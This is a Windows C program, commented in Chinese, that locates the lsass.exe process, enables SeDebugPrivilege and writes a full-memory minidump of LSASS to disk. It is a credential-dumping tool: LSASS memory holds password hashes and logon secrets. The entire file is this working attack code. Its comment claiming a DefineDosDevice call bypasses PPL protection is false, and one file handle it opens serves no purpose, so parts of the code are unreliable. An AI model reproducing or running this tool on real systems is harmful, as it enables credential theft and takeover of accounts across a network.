#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <DbgHelp.h>
#pragma comment(lib, "Dbghelp.lib")

int _tmain(int argc, TCHAR* argv[])
{
	// 获取Lsass进程ID
	DWORD dwLsassPID = 0;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap == INVALID_HANDLE_VALUE)
	{
		_tprintf(_T("CreateToolhelp32Snapshot failed, error code: %d\n"), GetLastError());
		return 1;
	}
	PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
	BOOL bFind = Process32First(hSnap, &pe);
	while (bFind)
	{
		if (_tcscmp(pe.szExeFile, _T("lsass.exe")) == 0)
		{
			dwLsassPID = pe.th32ProcessID;
			break;
		}
		bFind = Process32Next(hSnap, &pe);
	}
	CloseHandle(hSnap);

	if (dwLsassPID == 0)
	{
		_tprintf(_T("Lsass process not found.\n"));
		return 1;
	}


	// 开启SeDebugPrivilege
	HANDLE hToken;
	TOKEN_PRIVILEGES TokenPrivileges;
	BOOL bResult;

	bResult = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
	if (!bResult)
	{
		_tprintf(_T("OpenProcessToken failed, error code: %d\n"), GetLastError());
		return 1;
	}

	bResult = LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &TokenPrivileges.Privileges[0].Luid);
	if (!bResult)
	{
		_tprintf(_T("LookupPrivilegeValue failed, error code: %d\n"), GetLastError());
		return 1;
	}

	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	bResult = AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if (!bResult)
	{
		_tprintf(_T("AdjustTokenPrivileges failed, error code: %d\n"), GetLastError());
		return 1;
	}


	// 绕过PPL保护
	DefineDosDevice(DDD_RAW_TARGET_PATH, _T("LSASS"), _T("\\Device\\LSASS"));

	// 打开LSASS进程句柄
	HANDLE hLsass = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, FALSE, dwLsassPID);
	if (hLsass == NULL)
	{
		_tprintf(_T("OpenProcess failed, error code: %d\n"), GetLastError());
		return 1;
	}

	// 获取LSASS进程的句柄文件名
	TCHAR szFileName[MAX_PATH];
	DWORD dwSize = MAX_PATH;
	QueryFullProcessImageName(hLsass, 0, szFileName, &dwSize);

	// 打开LSASS进程句柄
	HANDLE hLsassFile = CreateFile(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

	if (hLsassFile == INVALID_HANDLE_VALUE)
	{
		DWORD dwLastError = GetLastError();
		LPVOID lpMessageBuffer = NULL;
		FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
			NULL, dwLastError, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPTSTR)&lpMessageBuffer, 0, NULL);
		_tprintf(_T("CreateFileLSASS failed, error code: %d: %s"), dwLastError, lpMessageBuffer);
		LocalFree(lpMessageBuffer);
		return 1;
	}

	// 导出Lsass进程内存
	_stprintf_s(szFileName, MAX_PATH, _T("%s-lsass.dmp"), argv[0]);

	HANDLE hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		_tprintf(_T("CreateFile2 failed, error code: %d\n"), GetLastError());
		return 1;
	}

	BOOL bSuccess = MiniDumpWriteDump(hLsass, dwLsassPID, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
	if (!bSuccess)
	{
		_tprintf(_T("MiniDumpWriteDump failed, error code: %d\n"), GetLastError());
		return 1;
	}

	CloseHandle(hFile);
	CloseHandle(hLsassFile);
	CloseHandle(hLsass);

	_tprintf(_T("Lsass memory dumped successfully.\n"));
}